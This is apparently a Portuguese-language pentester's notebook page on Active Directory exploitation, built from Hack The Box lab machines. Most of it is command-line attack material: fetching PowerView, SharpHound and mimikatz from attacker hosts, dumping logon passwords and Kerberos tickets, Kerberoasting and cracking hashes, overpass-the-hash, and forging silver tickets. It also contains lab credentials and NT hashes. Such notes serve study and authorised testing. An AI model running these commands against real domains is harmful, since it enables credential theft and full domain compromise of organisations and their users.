2-ActiveDirectoryExploitation
========================
## Enumerar hashes de senha

    impacket-GetNPUsers -request domain/ -usersfile valid_users.txt -dc-ip <ip_dc>

## 1 - Enumeração via BloodHound

```
SharpHound.exe -c all -d active.htb -SearchForest
```

```
SharpHound.exe -c all -d active.htb --LdapUsername <UserName> --LdapPassword <Password> --domaincontroller 10.10.10.100
```

## 2 - Enumeração manual

### Powershell

Enumeração de usuários

```
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain();$PDC = ($domainObj.PdcRoleOwner).Name;$SearchString = "LDAP://";$SearchString += $PDC + "/";$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"; $SearchString += $DistinguishedName; $Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString); $objDomain = New-Object System.DirectoryServices.DirectoryEntry;$Searcher.SearchRoot = $objDomain;$Searcher.filter="samAccountType=805306368";$Searcher.FindAll()
```

Enumeração de usuários (com mais detalhes):

```
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain();$PDC = ($domainObj.PdcRoleOwner).Name;$SearchString = "LDAP://";$SearchString += $PDC + "/";$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"; $SearchString += $DistinguishedName; $Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString); $objDomain = New-Object System.DirectoryServices.DirectoryEntry;$Searcher.SearchRoot = $objDomain;$Searcher.filter="samAccountType=805306368";$Result = $Searcher.FindAll(); Foreach($obj in $Result){Foreach($prop in $obj.Properties){$prop}Write-Host "------------------------"}
```

Enumerar grupos:

```
$ldapFilter = "(objectClass=Group)";$domain = New-Object System.DirectoryServices.DirectoryEntry; $search = New-Object System.DirectoryServices.DirectorySearcher; $search.SearchRoot = $domain; $search.PageSize = 1000; $search.Filter = $ldapFilter; $search.SearchScope = "Subtree";$results = $search.FindAll();foreach ($result in $results){$result.Properties.name}
```

Membros dos grupos:

```
$ldap_filter = "(name=LAPS_Readers)"; $domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain();$PDC = ($domainObj.PdcRoleOwner).Name;$SearchString = "LDAP://";$SearchString += $PDC + "/";$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))";$SearchString += $DistinguishedName;$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString);$objDomain = New-Object System.DirectoryServices.DirectoryEntry;$Searcher.SearchRoot = $objDomain;$Searcher.filter=$ldap_filter;$Result = $Searcher.FindAll(); Foreach($obj in $Result) {$obj.Properties.member}
```

Enumerar domain admins:
```
$ldap_filter = "(|(name=Domain Admins)(name=Administrators))"; $domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain();$PDC = ($domainObj.PdcRoleOwner).Name;$SearchString = "LDAP://";$SearchString += $PDC + "/";$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))";$SearchString += $DistinguishedName;$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString);$objDomain = New-Object System.DirectoryServices.DirectoryEntry;$Searcher.SearchRoot = $objDomain;$Searcher.filter=$ldap_filter;$Result = $Searcher.FindAll(); Foreach($obj in $Result) {$obj.Properties.member}
```

#### PowerView


```
(new-object net.webclient).downloadfile('http://10.10.14.17/PowerView.ps1', 'c:\temp\pv.ps1')
. .\pv.ps1
get-netsession -computername htb.local
get-netloggedon -computername htb.local
```

    get-netdomain
    
    get-domainuser "a0106003" #olhar um usuário específico


#### SharpHound:

```
(new-object net.webclient).downloadfile('http://10.10.14.17/SharpHound.exe', 'c:\temp\sh.exe')
./sh.exe
```

```
download 20240125121655_BloodHound.zip
#ou
copy 20240125121655_BloodHound.zip \\10.10.14.17\smb\bh.zip
```

#### bloodhound-python

```
bloodhound-python -u <username> -p <password> -d <domain> -v --zip -c All -dc <dc_hostname> -ns <dns_ip>
```

```
#Exemplo
bloodhound-python -u mhope -p '4n0therD4y@n0th3r$' -d MEGABANK.LOCAL -v --zip -c All -dc MEGABANK.LOCAL -ns 10.10.10.172
```

Depois precisamos iniciar o neo4j console para conseguir abrir o bloodhound:

```
sudo neo4j console
<CTRL+Z>
bg
bloodhound
```

Vale considerar que já deixei as credenciais salvas para evitar problemas

### Enumerar hashes de senha ou senhas em texto claro

Detalhe que podemos enumerar o console history do powershell cmo WinPEAS, por exemplo pra fazer a enumeração completa:

```
wget http://10.10.14.17/4-privilege%20escalation/winPEASx64.exe -o wp.exe
./wp.exe
```

**NESTA ETAPA É INTERESSANTE QUE TENHAMOS FEITO A ESCALAÇÃO DE PRIVILÉGIO PARA CONSEGUIR CONDUZIR MAIS ALGUNS TESTES, SENDO ELES:**

```
wget http://10.10.10.10/6-ADTools/mimikatz/x64/mimikatz.exe -O m.exe
#ou 
copy \\192.168.0.165\smb\mimikatz.exe c:\temp\m.exe
```

```
./m.exe
privilege::debug
sekurlsa::logonpasswords
```

Agora para tickets **kerberos**, podemos fazer da seguinte maneira:

```
./m.exe
privilege::debug
sekurlsa::tickets
```

Aqui teremos duas opções de extração, sendo elas TGS e TGT. No caso de já termos o acesso adm, basta obtermos o ticket do SPN da seguinte maneira:

```
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList
'<SPN_Name>'
```

Caso não consiga, basta informar a credencial para que as coisas aconteçam:

```
$pass = ConvertTo-SecureString 's3rvice' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('htb.local\svc-alfresco',$pass)
get-domainspnticket -spn IMAP/EXCH01.htb.local -credential $cred
```

Depois podemos verificar que conseguimos o ticket de duas maneiras:

```
klist
```

ou

```
./m.exe
privilege::debug
kerbertos::list /export
```

Outra opção:

```
impacket-GetUserSPNs -dc-host forest.htb.local htb.local/svc-alfresco -k -no-pass
```

Ainda outra opção:

```
r.exe kerberoast /outfile:kerberoastables.txt /domain:active.htb /dc:dc.active.htb /format:john
hashcat -m 13100 -a 0 ticket.kirbi /usr/share/wordlists/rockyou.txt
```

Depois de requisitado esse ticket, podemos quebrá-lo de algumas formas, mas a mais tranquila seria com o tgsrepcrack.py

<figure><img src="../.gitbook/assets/image (3).png" alt=""><figcaption><p>tgsrepcrack</p></figcaption></figure>

```
python /usr/share/kerberoast/tgsrepcrack.py wordlist.txt 1-40a50000-
Offsec@HTTP~CorpWebServer.corp.com-CORP.COM.kirbi
```

Outra opção seria com john the ripper

kirbi2john.py

<figure><img src="../.gitbook/assets/image (5).png" alt=""><figcaption><p>kirbi2john.py</p></figcaption></figure>

```
python kirbi2john.py /path/file.kirbi > kirbi.john
john --wordlist=/usr/share/rockyou.txt kirbi.john
```

Ainda temos outra forma de obter tickets via kerberos com o impacket. Vejam este exemplo:

a partir da enumeração deu pra obter a senha, mas caso consigamos o hash, também podemos obter o ticket, conforme os comandos abaixo:

```
impacket-getTGT -dc-ip <IP_do_DC> domain/user:password
```

Exemplo

```
impacket-getTGT -dc-ip 10.10.11.168 scrm.local/ksimpson:ksimpson
```

E agora o exemplo com o hash da senha (notem que fiz a conversão da senha para o hash NT):

```
iconv -f ASCII -t UTF-16LE &#x3C;(printf "ksimpson") | openssl dgst -md4
#ou
python -c 'import hashlib,binascii; print(binascii.hexlify(hashlib.new("md4", "ksimpson".encode("utf-16le")).digest()))'
```

```
impacket-getTGT -dc-ip 10.10.11.168 scrm.local/ksimpson -hashes :5f38c0485f0c23f8dedf9bf23ffa5336
```

<figure><img src="../.gitbook/assets/image (4).png" alt=""><figcaption><p>Conversão do NTLM para Kerberos (Over Pass the Hash)</p></figcaption></figure>

Agora já temos condições do obter os hashes de senhas necessários por meio do seguinte comando:

```
export KRB5NAME=/home/acosta/owncloud/Area_de_trabalho/estudos/hack_the_box/scrambled/Administrator.ccache
```

```
impacket-GetUserSPNs scrm.local/ksimpson -k -no-pass -request -dc-host dc1.scrm.local
```

**Dar atenção neste último comando, pois o nome do -dc-host deve ser conforme está no registro de DNS pra que o comando funcione corretamente.**

Agora, temos de fazer o silver ticket

### Silver ticket

Aqui precisamos de algumas informações. **Não necessitamos de um usuário com privilégio administrativo pra esse cara. Isso é IMPORTANTE.**

Então temos que ir atrás de:

1\) Domain SID

2\) Hash

3\) Nome do domínio

4\) SPN

#### Obtendo o domain SID

```
impacket-getPac -targetUser administrator domain/user:password
```

```
impacket-getPac -targetUser administrator scrm.local/ksimpson:ksimpson
```

**Obtendo o silver ticket**

```
impacket-ticketer -nthash 5f38c0485f0c23f8dedf9bf23ffa5336  -domain-sid S-1-5-21-2743207045-1827831105-2542523200 -domain scrm.local -dc-ip dc1.scrm.local -spn MSSQLSvc/dc1.scrm.local:1433 administrator
```

Caso já tenha acesso na máquina

```
whoami /user
#Daí, com o mimikatz, a gente faz o seguinte:
./m.exe
kerberos::list
kerberos::golden /user:user /domain:domain.com /sid:domain-SID /target:SPN /service:HTTP
/rc4:NTLM /ptt
#Exemplo
kerberos::golden /user:offsec /domain:corp.com /sid:S-1-5-21-1602875587-
2787523311-2599479668 /target:CorpWebServer.corp.com /service:HTTP
/rc4:E2B475C11DA2A0748290D87AA966C327 /ptt

kerberos::list
```

Tem a demonstração deste ataque no seguinte vídeo (Scrambled - Hack the box):

{% embed url="https://www.youtube.com/watch?v=_8FE3JZIPfo&ab_channel=IppSec" %}

[https://www.hackingarticles.in/lateral-movement-pass-the-ccache/](https://www.hackingarticles.in/lateral-movement-pass-the-ccache/)



